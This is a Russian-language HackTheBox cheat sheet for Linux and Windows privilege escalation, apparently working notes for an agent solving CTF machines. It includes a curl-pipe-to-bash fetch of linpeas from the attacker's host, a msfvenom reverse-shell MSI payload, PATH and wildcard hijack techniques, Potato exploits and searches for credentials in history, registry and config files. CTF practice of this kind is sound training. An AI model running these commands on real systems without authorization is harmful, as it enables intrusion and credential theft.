# HTB: повышение привилегий Linux и Windows

## Linux: быстрый порядок

Порядок — по цене проверки, каждый вектор закрывай доказательно (выводом), а не «вроде чисто»: sudo → SUID/capabilities → цепочки исполнения root (раздел ниже) → группы docker/lxd/disk → NFS → пароли в файлах и чужие пользователи → ядро СТРОГО последним. Типичная ошибка — уйти в перебор паролей или ядерную экзотику, не дочитав, что root уже исполняет сам.

```bash
id; sudo -l; hostname; uname -a; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null | grep -v "=$"
crontab -l; ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null
ss -tlnp; ps auxww | head -50
curl http://$LHOST:8000/linpeas.sh | bash 2>&1 | tee /tmp/linpeas.txt   # http-сервер у нас из /opt/tools/linux
/opt/tools/linux/pspy64   # на цели: процессы и cron без рута, смотреть 2-3 минуты
```

- LinPEAS вывод читать по секциям с красными/жёлтыми пометками, а не целиком простынёй: sudo, SUID, capabilities, writable paths в PATH крона, docker.sock, NFS no_root_squash, старые ядра.
- SUID/sudo бинарь найден → искать его имя в материалах (GTFOBins): запрос — просто имя бинаря (`vim`, `find`, `env`...). Команда из GTFOBins зависит от контекста: sudo и suid — разные секции.
- Крон с относительным путём или записываемым скриптом: проверить владельца и права `ls -la`, PATH в самом crontab.
- Группа docker/lxd/disk: самодостаточный рут, команды в материалах по запросу `docker group privilege escalation` / `lxd privilege escalation`.
- Сервисы только на 127.0.0.1 (`ss -tlnp`): внутренние админки, БД и менеджеры, снаружи не видимые, — ходить curl-ом с самой цели или пробрасывать chisel-ом (htb-03); в их конфигах часто креды рута или другого юзера.
- Другие пользователи той же машины: `ls -la /home`, чужие `~/.ssh` и `~/.bash_history`, `/var/mail`, записываемые домашние и рабочие папки. Найденный пароль пробовать ВЕЗДЕ (ssh/su/sudo/веб/БД) — переиспользование кред норма на HTB.
- Ядро: `/opt/tools/linux/linux-exploit-suggester.sh` на цели, затем `searchsploit linux kernel <версия>` у нас. Ядерные эксплоиты — последний вариант: могут повесить машину, предупредить пользователя.
- Пароли в окружении: `env`, история `~/.bash_history`, конфиги сервисов в `/etc` и веба в `/var/www`, `grep -rI --include=*.php --include=*.env -i pass /var/www 2>/dev/null | head`.

## Linux: цепочки исполнения root (cron, таймеры, incron, сервисы, демоны)

Самый частый «лёгкий» рут: root регулярно исполняет код, который читает или подключает (source/include/require) файлы из места, куда можешь писать ты. Искать не «записываемый скрипт», а всю ЦЕПОЧКУ от триггера до исполняемого кода.

Источники исполнения — собрать все, а не только cron:

```bash
cat /etc/crontab; ls -la /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /var/spool/cron/crontabs 2>/dev/null
systemctl list-timers --all --no-pager 2>/dev/null; systemctl list-units --type=service --state=running --no-pager 2>/dev/null
ls -la /etc/incron.d /var/spool/incron 2>/dev/null; ps auxww | grep -i incron | grep -v grep
ps auxww   # процессы UID 0: что за бинарь (readlink /proc/<pid>/exe), откуда и с каким cwd запущен
```

Для КАЖДОЙ найденной команды, скрипта и сервиса:

1. Прочитай скрипт/юнит целиком. Выпиши ВСЁ, что он трогает: подключаемые файлы (source, include, require, import локальных модулей), конфиги, вызываемые бинари без полного пути (решает PATH из crontab или `Environment=` юнита), wildcard-шаблоны (`tar/rsync/chown … *` — инъекция опций именами файлов вида `--checkpoint=1`), временные файлы с предсказуемыми именами.
2. По каждому файлу цепочки и КАЖДОЙ его родительской папке: `namei -l /полный/путь/к/файлу` — права и владельцы всех звеньев одним выводом. Запись в родительскую папку = файл можно заменить (`mv`), даже если сам файл root-only. Записываемый конфиг или include в веб-корне (`/var/www/...`) — обычное дело для PHP-приложений: сервис от root инклюдит то, что правит веб-юзер.
3. Бинарь ищется по PATH — проверяй права на каждую папку PATH в том же порядке; первая записываемая выигрывает.
4. Сверь статику с реальностью: `pspy64` 2–3 минуты показывает фактические запуски с UID=0 и их полные команды — incron по событиям файловой системы и systemd-таймеры в crontab не видны, а тут видны.

Вектор считается закрытым, только когда цепочка прослежена до конца и записываемых звеньев нет; «скрипт принадлежит root» ещё ничего не значит без проверки того, что он подключает и откуда запускается.

## Windows: быстрый порядок

```powershell
whoami /all
systeminfo
net user; net localgroup administrators
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ChildItem C:\Users -Force; Get-ChildItem C:\ -Force
```

Дальше winPEAS (`/opt/tools/windows/winPEASx64.exe` отдать как в htb-03) и ручная проверка частого:

- `SeImpersonatePrivilege` в `whoami /priv` → Potato-семейство (PrintSpoofer/GodPotato): бинари качать прицельно под версию, шаги искать в материалах `windows local privilege escalation impersonate`.
- Службы: `sc qc <svc>`, незакавыченные пути (unquoted service path), записываемые бинари служб: `icacls <путь>`.
- AlwaysInstallElevated: оба ключа реестра HKLM+HKCU = 1 → `msfvenom -p windows/x64/shell_reverse_tcp -f msi`.
- Автологин и креды в реестре: `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`, файлы unattended: `C:\Windows\Panther\Unattend.xml`, `sysprep.inf`.
- Задачи планировщика от SYSTEM с записываемыми файлами: `schtasks /query /fo LIST /v | findstr /i "task to run"`.
- PSHistory: `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` у всех юзеров.

## Проверка результата

Флаг прочитан новым пользователем (`whoami` после повышения), а не «команда вроде отработала»: показывать пользователю `id`/`whoami` и содержимое `root.txt` из той же сессии. Вектор повышения одной строкой — карточкой результата в память задачи.
